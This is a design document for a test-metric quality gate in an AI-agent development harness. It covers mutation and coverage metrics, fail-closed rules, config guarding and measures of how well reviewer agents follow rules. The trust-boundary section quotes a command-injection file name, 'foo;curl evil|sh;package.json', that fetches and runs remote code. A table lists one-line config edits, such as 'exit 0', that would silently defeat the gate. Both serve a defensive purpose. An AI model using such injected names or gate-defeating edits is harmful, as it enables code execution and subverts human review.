# Measured Gates — why the harness counts instead of judging

Read this before changing `scripts/harness-quality-gate.mjs`, the thresholds schema, or any
rubric that cites a number. It explains what each metric proves, which metrics must never
become gates, and why the measurement itself is the first thing to distrust.

## The problem this solves

Before v1.2 the harness's approval bar was two 0–10 scores from `code-reviewer` and
`architecture-reviewer`, neither of which received a measured number, both running the cheapest
model in the matrix. Everything downstream — Judge, commit, handoff — inherited a subjective
verdict. Measurement is not a layer beside the harness; it is the missing **input** to gates
that already existed.

## The four test types, and what each actually proves

| Metric | Proves | Does not prove |
|---|---|---|
| **Coverage** | the line executed | that anything was asserted |
| **Mutation** | the test *asserts* behaviour — change the code, the test fails | that the behaviour is the right one |
| **Regression** | a bug that was fixed stays fixed | anything about code never broken before |
| **E2E** | the assembled system works | which unit is wrong when it doesn't |

Coverage is a floor. **Mutation is the target.** <!-- prose-threshold-ok: illustrative --> A suite can hold 100% line coverage
and still pass after you delete a `.save` — that test executed the line and asserted nothing. When
coverage and kill ratio disagree, the kill ratio is the real number, and the gap between them is
the work list: covered-but-unkilled lines are exactly where assertions are missing.

Plus three structural metrics, which measure the shape of the code rather than the tests:
**dependency boundaries**, **module size**, and **cyclomatic complexity**. AI-generated code
tends toward monolithic functions; these three are what force the split.

## Categorical gates only

A gate must produce a **binary** verdict against a declared threshold. Metrics that only ever
drift upward are not gates.

Two real examples of gates that were built and then removed, from the Rails experiment this
design is based on:

- **Total allocations across the suite** — baseline ~3.07M objects, ceiling +15%.
- **SQL queries per controller action** — rule "+25% or +3 queries, whichever is more
  permissive".

Both failed the same way: the number only goes up as the app grows, so every few weeks someone
raises the ceiling. The gate becomes a ritual of bumping its own threshold, and a threshold that
moves whenever it is inconvenient measures nothing. *Not every measurement is a signal.*

Performance and allocation trends belong in `harness-benchmark`, as **advisory** reports. If
someone asks for response time as a gate, the answer is no, and this section is why.

## Distrust the measurement before the code

A mutation kill ratio of 74.77% was celebrated and was wrong. `RAILS_ENV` was unset in the
mutation bootstrap, 33 request specs failed in development mode, and the real number was
67.89% — a 7-point inflation, invisible in the number itself. It was found only by comparing
local artifacts against CI artifacts.

Two rules follow:

1. **Every report records provenance** — tool versions and the environment variables that change
   a tool's meaning (`NODE_ENV`, `RAILS_ENV`, `PYTHONPATH`, `CI`).
2. **A new metric is observe-only until it agrees with itself across two independent runs.** A
   number nobody has cross-checked is a rumour with a decimal point.

And a corollary that matters more than it looks: **`unavailable` is not a pass.** A gate that
exits 0 while measuring three of nine rows tells you almost nothing. Read the report, not the
exit code.

## Trust boundary — read this before running the gate in a repo you did not write

`commands.{complexity, module_size, security, boundaries, mutation}` and
`suites.{regression,e2e}.command` come from `agent-os/quality-thresholds.json`, a **project-local,
git-tracked file**, and they are executed through a shell. Running the gate in a repo is therefore
equivalent to running its `Makefile`.

That is a deliberate design — a project must be able to declare how it is measured — but it has a
rule attached:

> **Never run `harness-quality-gate` in a repository whose `quality-thresholds.json` you have not
> read.** Pass `--no-project-commands` when you have not, or cannot. Every metric that needs a
> project command then reports `unavailable` — by choice, and the report says so.

Two properties keep this honest:

- **The config file is itself a high-risk path.** `**/quality-thresholds.json` and
  `**/quality-decisions.md` are in the default `high_risk_paths`, so a change to either forces
  tier `full` and a human read.
- **The whole config is guarded, not just thresholds.** See below.

Everything else the gate runs is a built-in adapter invoking a known tool, and **git is never
invoked through a shell** — paths are passed as arguments, because a file named
`foo;curl evil|sh;package.json` would otherwise be arbitrary code execution in a repo an agent
merely inspected.

## What the config guard covers

`guardThresholds` compares the **entire configuration** against the merge-base, not one field.
Guarding only `metrics.*.threshold` left the gate defeatable by a one-line edit that needed no
recorded decision:

| Edit | Effect | Guarded now |
|---|---|---|
| `suites.regression.command` → `exit 0` | the only Phase-A blocking metric goes green | yes |
| delete `"mode": "blocking"` | nothing can ever FAIL | yes |
| `commands.security` → `echo 0` | findings become 0 with no scanner run | yes |
| flip a `direction` min→max | a floor becomes a ceiling | yes |
| delete a metric key | the row vanishes — not even `unavailable` | yes |
| remove entries from `high_risk_paths` | mandatory review disappears | yes |
| retreat `phase` C→A | blocking metrics stop blocking | yes |

A change that only makes the gate **stricter** needs no justification — ratcheting up is the
intended direction. Anything else requires a dated entry in `quality-decisions.md`, and the guard
reads both committed and working-tree edits so the escape hatch works in one uncommitted change.

The config fingerprint is printed in every report, so a reviewer can see at a glance whether the
gate's own rules moved.

## Output contract for configured commands

`commands.complexity`, `commands.module_size`, `commands.security` and `commands.boundaries` let a
project override an adapter. The contract is narrow on purpose:

> **Print the metric as the last number on the last non-empty line of stdout.**

Taking the first number anywhere turned `Scanned 120 files, found 3 issues` into a
`security_findings` of 120 — silently, and blocking once Phase B flips these metrics. If your tool
cannot be made to print one number, wrap it in a one-line script that does.

`suites.regression.command` and `suites.e2e.command` are different: they run a test suite, and the
gate parses **failing plus quarantined** counts out of the output (`N failed`, `N skipped`,
`N pending`, `N todo`). Each is counted independently, so `20 passed | 5 skipped` scores 5 — a
skipped regression test is a red metric, not a TODO. If neither count can be parsed, the gate falls
back to the command's exit code.

## The gate fails closed

A missing, `unconfigured`, stale, or crashed gate never produces the `auto` tier and never
satisfies an approval input — it routes to `full` review. The naive rule ("`full` only when a
metric failed") would give a project with no thresholds file *less* review than it had before
the gate existed. No report is not a green report.

Exit codes keep this honest: `0` pass/observe, `1` a blocking metric failed, `2` **the gate
itself could not run**. Never conflate 1 and 2 — a broken gate is not failing code, and agents
that confuse the two go off and "fix" working code.

Three consequences that are easy to get backwards, each of which was a real bug before it was a rule:

- **`auto` requires a `full` report.** A `local` run filters mutation and e2e out of its rows
  entirely, so a green local report says nothing about test strength or the assembled system. Since
  `auto` means nobody reads the diff, a green local gate routes to `sampling`, not `auto`.
- **Every risk class consumes review.** `medium` routes to `sampling`. Letting it fall through to
  `auto` made PREVC's medium-risk evidence rule unreachable while the output still printed
  "Risk: medium".
- **An unknown `--declared-risk` is an error, not a shrug.** Silently ignoring a typo like
  `untruted` gave the operator the *least* review when they asked for the most.

## What the gate cannot see

This list is the reason the gate exists — attention it frees gets spent here. It lives in each
project's `docs/review.md`, kept current by what actually escapes:

- business-logic correctness, and whether the **right** feature was built at all
- race conditions and concurrency
- unbounded loops and slow paths that aren't N+1 shaped
- memory leaks
- authorization logic and trust boundaries that look correct
- idiomatic fit with this codebase
- architectural direction

The argument was never "stop thinking about the code". It is: stop spending human attention on
what a tool checks, so it lands on what needs a brain.

## The `--check-sources` guard

`node harness-quality-gate.mjs --check-sources` greps the harness for numeric quality claims in
prose, because prose thresholds drift into contradiction — `code-reviewer.md` and
`web-platform-engineer.md` both carried the same file-length claim, and both disagreed with any
sane threshold.

Scope is deliberately narrow: `agent/`, `templates/`, `docs/harness/`, and `skills/harness-*`.
It does **not** scan `skills/writing-skills/` or any other skill outside the `harness-*`
namespace, where line counts are ordinary prose about document length. A check with permanent
false positives gets disabled, which is worse than no check.

For a genuinely illustrative number — an example row in an output format, or a sentence
explaining why a metric misleads — annotate the line with `prose-threshold-ok` and a reason.
Annotate; do not widen the patterns until they catch nothing.

## Canonical invocation

The gate lives in the global harness, not in each project, so anything installed into a project
must call it by absolute path — the convention every other harness command already follows:

```
Windows:  node "$env:USERPROFILE\.config\opencode\scripts\harness-quality-gate.mjs" --mode local
POSIX:    node "$HOME/.config/opencode/scripts/harness-quality-gate.mjs" --mode local
```

A relative `node scripts/harness-quality-gate.mjs` written into a template is a
command-not-found in every project that installs it — and since that command is the *definition*
of evidence, the requirement would silently evaporate.

## Tool matrix

| Metric | TS/JS | Python | Ruby/Rails | Go |
|---|---|---|---|---|
| coverage | `vitest --coverage` / `jest --coverage` | `pytest --cov` | SimpleCov | `go test -cover` |
| mutation | Stryker (`--mutate` changed files) | `mutmut` / `cosmic-ray` | Mutant (`--since`) | `go-mutesting` |
| complexity | ESLint `complexity` | `ruff` C901 / `radon cc` | RuboCop + Flog | `gocyclo` |
| module size | ESLint `max-lines` | `radon raw` | RuboCop `ClassLength` | `gocyclo` |
| boundaries | `dependency-cruiser` | `import-linter` | Packwerk | `go list` cycles |
| static security | `semgrep` / `npm audit` | `bandit` + `pip-audit` | Brakeman | `gosec` |
| regression | the declared `suites.regression` selector — failing + quarantined count | | | |
| e2e | Playwright / Cypress | Playwright | system specs | — |

Choices worth knowing: mutation is scoped to changed files where the tool supports it, because a
full-repo mutation run costs minutes and multiplies across parallel lanes. Where the tool cannot
scope, mutation is full-mode only and may honestly report `unavailable` — the Rails experiment
did exactly that with Packwerk rather than pretend a row was green.

## Metrics reference

Thresholds themselves live in `agent-os/quality-thresholds.json`, per project. **No number in
this document.** Every metric below is explained here and configured there.

| Metric | Direction | Speed | Notes |
|---|---|---|---|
| `line_coverage` | min | local | floor beneath mutation |
| `branch_coverage` | min | local | floor beneath mutation |
| `cyclomatic_max` | max | local | worst single function |
| `module_lines_max` | max | local | proxy for single responsibility |
| `security_findings` | max | local | static scanner, medium+ confidence |
| `boundary_violations` | max | local | dependency direction |
| `regression_suite` | max | local | **ships blocking** — counts failing + quarantined; only `0` passes; no suite ⇒ `unavailable` |
| `mutation_kill_ratio` | min | full | **ratchet** against baseline; the real test-strength number |
| `e2e_suite` | max | full | counts failing + quarantined |

`regression_suite` is the one metric that ships `blocking` in Phase A. It has no calibration
problem — the only passing value is zero — and leaving it observing would make "a bug fix
without a regression test is not a fix" enforce nothing until Phase C.

Because it is blocking, the bug-fix heuristic that drives it must never fire on a fix that *does*
have a test: it counts committed, working-tree **and untracked** files. A new regression test that
isn't `git add`ed yet is still a regression test, and treating it as absent would refuse the commit
trailer for work that did everything right.

## Adherence rows — measuring the agent, not the artifact

Everything above measures the artifact. The adherence rows measure the agent: which written rule
was broken, whether the reviewer can cite a rule at all, and how much of the rulebook a program
checks. They enter at `observe` like every other row; thresholds and baselines stay `null` until
stage-1 runs produce them, and every threshold is set from a measured baseline, never from an
aspiration. No number in this table — the honest column is what the row proves, copied from
`continual-harness.md`.

| Metric | Direction | Speed | Proves | Does not prove |
|---|---|---|---|---|
| `citation_competence` | min | full | that the cheap reviewer can emit a resolving rule pointer **at all** | that the pointers it emits are the right ones |
| `reviewer_recall_estimate` | min | full | how much the cheap reviewer misses relative to the paid one on the same diff | absolute recall — the paid reviewer is a better instrument, not a perfect one |
| `rule_violations_enforced` | max | local | a promotion-backed rule was broken, and which one | how often rules were broken — only how often that was *caught* |
| `rule_violations_prose` | max | local | a prose rule was broken, and which one | anything else — **pinned to `observe`, permanently** |
| `adherence_per_changed_lines` | max | local | whether one lane capability drops rules faster than another (grouped by capability) | anything about models — eighteen of nineteen agents run one model |
| `unciteable_findings_ratio` | max | local | reviewer discipline: how often a reviewer objected with no rule to point at | that a *plausible but wrong* pointer was not manufactured |
| `enforced_fraction` | min | local | how much of the rulebook a program checks | that the enforced rules are the important ones — **it is not the governing metric** |
| `rules_active` / `rules_retired` | — | local | whether the ledger is a working set or an archive, and whether `enforced_fraction` rose by enforcing or by deleting | whether the surviving rules are correct |

Both competence rows are **relative** wherever printed: the paid reviewer is a better instrument,
not a perfect one.

A roster where the paid and cheap entries share one model measures nothing — attribution keys on
`model`, so both compared sets would be the same records and the number would be 1.0 (or 0 with an
empty cheap side). The adapter emits `unavailable` for both liveness rows instead, and a single-entry
roster with `sample: true` is the same case: the cheap fallback IS the paid entry.

### The prose pin is load-bearing, not decoration

The split into `rule_violations_enforced` and `rule_violations_prose` is the whole mechanism.
The adapter resolves each `rule_violation` against the ledger and routes it by `enforcement`
(`lint` / `test` / `gate_metric` are the only values that may ever back a blocking row); a
pointer matched by active rules with *different* enforcement is a ledger conflict and routes to
prose. The prose row is pinned to `observe` structurally, not by convention: if the config ever
flips it to `blocking`, the adapter **refuses the reading** with the pin reason, and `unavailable`
never fails a gate — one word in a config must not let a machine-drafted sentence refuse a
commit. The adapter emits each record's `enforcement` value into the report, so the reader can
see which violations were promotion-backed.

### `enforced_fraction` — defined so it means something

```
numerator   = active rules with enforcement in (lint, test, gate_metric)
              AND stats.runs_since_approval >= enforced_fraction_min_runs
denominator = active rules meeting the same age condition
```

The age condition reads **`stats.runs_since_approval`** — a counter of full runs since the rule was
approved, not a date (`created_at_run` never enters this fraction; a corrected wording replaced an
earlier sentence that said it did).

Four rules, each closing a defect:

- **Empty ledger, or 0/0 → `unavailable`.** Never 0, never 1.
- **The ratchet may not be seeded from a null-threshold run.** `threshold: null` with
  `direction: min` passes `0 >= null`, which seeds `baseline = 0` and pins the ratchet bar at
  zero forever. Until a threshold exists, the adapter refuses the reading entirely — `unavailable`
  is also the honest status, because a ratchet with no bar would print as a green number.
- **Retirement is neutral.** The age condition excludes rules approved in the current run, so
  retiring a young prose rule cannot inflate the ratio. Without it, the cheapest way to raise the
  number would be to delete the rulebook — which the citation window and the per-target cap do
  automatically.
- **`rules_active` and `rules_retired` ship alongside**, so a rise by deletion is visible in the
  same table. An empty ledger is an honest zero for the observation rows; a missing ledger is
  `unavailable`.

### The detection ceiling — bounded, not removed

**Adherence counts detected violations, not real ones.** A degraded reviewer producing fewer
findings reads as progress — the control reporting success while measuring less. `citation_competence`
plus `reviewer_recall_estimate` bound that blind spot: they say whether the reviewer can cite at
all and how much it misses, relative to the paid reviewer. Only an **enforced rule** removes the
ceiling, because a program checking the rule no longer depends on reviewer recall. A better
reviewer never removes it.

### Counts never mix tiers

At tier `sampling` reviewers see a subset, so counts from different tiers mix populations. The
adapter counts only the newest findings file's tier and **excludes** entries of other tiers,
stating the exclusion in the report — cross-tier comparison is refused, not approximated. The
liveness rows come from the newest run's own roster, never from another tier's file. The same
discipline holds for `harness-findings.mjs --window <n> --json` (the Refine phase's input):
its derived counts and `proposeBar` block read only the newest available file's tier, and the
JSON/text state the anchor `tier` and every excluded file (FINAL-R2) — a consumer of the CLI
gets the same refusal the adapter's report carries.

### A violation count is a floor, never a rate (invariant 20)

Any consumer printing a violation count prints the recall estimate beside it, or states that it
is absent. The adapter carries the annotation inside every violation-derived reading, so a
renderer printing `detail` prints it too — and a test fails if a count loses it. A count with no
recall estimate is a **floor**; calling it a rate is the false-green path review F10 describes.

### `findings/` is excluded from the source hash — and the bound is the window, not the filename

`docs/harness/findings/` is excluded from `sourceHash` because findings are written **after** the
gate runs: inside the hash, every write would stale the fresh report and refuse the commit trailer
— a fail-closed loop triggered by correct behaviour. The rulebook (`agent-os/standards/`,
`docs/review.md`, `learned-rules.json`) stays **inside** the hash; the ordering in the continual
harness — prose lands after the code commit and its trailer, as a separate rulebook commit — is
what makes that survivable. Do not "fix" the ordering by widening the exclusion to the rulebook:
that reproduces the `**/auth/**` TOCTOU on the rulebook itself.

The accurate residual bound is: the newest findings file's recorded gate-report `sourceHash` must
equal the evaluated report's hash **by value**, older files' hashes must be findable in commit
trailers, a **reviewer roster** must exist (no roster → `unavailable`), and a presence↔tier
cross-check must pass. It is **not** the filename — the findings directory is listable, so copying
a name costs nothing — and it is **not** analogous to the strictest-candidate rule that bounded
the previous gate report; that comparison is withdrawn, because a findings window has neither the
content binding nor the direction constraint the v1.2 defences ran on.

### The adherence adapter reads the global findings module by absolute path

The adapter imports the **global** `scripts/harness-findings.mjs` by module path — it never shells
out to a project command and never reads a project-local copy. That keeps the trust boundary
above unchanged: a project that overrides `commands.*` or `suites.*` cannot change what the
adherence rows count.

## When is a report credible?

Fail-closed is not just "a missing report routes to full". A report on disk is credible only if
**all** of these hold — each condition closes a fail-open that existed once:

| Condition | Why |
|---|---|
| verdict is `pass` | obvious |
| not `unconfigured` | it measured nothing |
| `sourceHash` is **present** | a missing hash skipped the staleness comparison entirely, so a forged five-field JSON — or any report written outside a git tree — stayed credible forever |
| `sourceHash` still matches | staleness by content, including the gate's own config |
| `rows` is non-empty | `rows: []` has zero red rows, so everything downstream read it as green |
| a `full` report covers every configured metric | a truncated report does not describe the configured gate |

The source hash covers tracked and untracked source files **plus the thresholds file's
configuration with baselines stripped**. That last part matters: excluding the config entirely
allowed a TOCTOU — remove `**/auth/**` after a green run and the mandatory-review tier vanished
while the report still read as fresh. Including the raw file instead would self-stale every report,
because the gate writes baselines into it.

And `auto` — the tier where nobody reads the diff — additionally requires a **full**-mode report. A
local run filters mutation and e2e out of its rows entirely.

## Baselines

Only the scheduler's `full` run writes a baseline, only when the row **passed**, and for a `ratchet`
metric only in the improving direction. Each of those three conditions blocks a real decay path:

- A lane writing baselines races other lanes on one JSON file.
- Recording a value from a **failing** row — including an `observe` breach, which is not a hard
  failure — seeds the bar with the number you were trying to beat. For a ratchet metric that becomes
  the permanent bar, and `--check-sources`-style guards never see it because no `threshold` moved.
- Letting a ratchet baseline move backwards is the same decay in slow motion.

The threshold guard reads the working tree for the loosening **and** for its justification. Reading
only committed history made the escape hatch unusable: loosening a threshold and appending its
reason in the same uncommitted edit failed with "no new entry".

## Rollout phases

**A — observe.** Every metric reports, nothing blocks (except `regression_suite`). Collect
baselines from real work. Exit when each intended metric has a baseline from two agreeing runs.

**B — block the easy tier.** Set thresholds *from Phase A baselines*, flip the local-speed
metrics to `blocking`, enable the `auto` tier. Mutation stays observing.

**C — full gate.** Mutation blocking on a ratchet; write-back and threshold-ratchet proposals
enabled.

Do not skip A. Thresholds set from aspiration rather than measurement are the fastest route to
a gate everyone disables.

## Sources

- Codeminer42, *"Pare de ler código de IA, comece a medi-lo: um guia de Rails"* — the five
  metrics, one `rake quality` command, thresholds in a versioned file, mutation on a ratchet.
- Codeminer42, *"How far can AI self-validate Rails code"* — the local/CI split, the security
  and N+1 gates, the removed drift gates, and the bootstrap bug.
- `agent-os/specs/2026-08-10-1435-measured-quality-gates/` — this harness's spec, audit, and
  review findings.
